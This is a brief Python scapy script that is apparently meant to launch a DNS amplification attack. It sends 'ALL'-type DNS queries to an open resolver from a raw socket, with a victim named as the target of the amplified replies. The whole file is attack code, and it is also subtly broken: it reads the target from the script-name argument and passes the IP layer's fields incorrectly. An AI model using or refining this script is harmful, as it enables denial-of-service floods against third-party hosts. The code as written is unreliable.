from scapy.all import *
import sys
import socket
#from netaddr import *
import random
import datetime
from random import randrange

try:
    TARGET=sys.argv[0]
    DNS_SERVER=sys.argv[1]
except:
    #print "Usage: ./"+__file__+" [TARGET] [AMP LIST]"
    exit(1)
mySock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
packet=IP(DNS_SERVER,TARGET)/UDP()/DNS(rd=1,qd=DNSQR('www.google.com', qtype='ALL'))

mySock.sendto(packet.build(), (DNS_SERVER, 53))
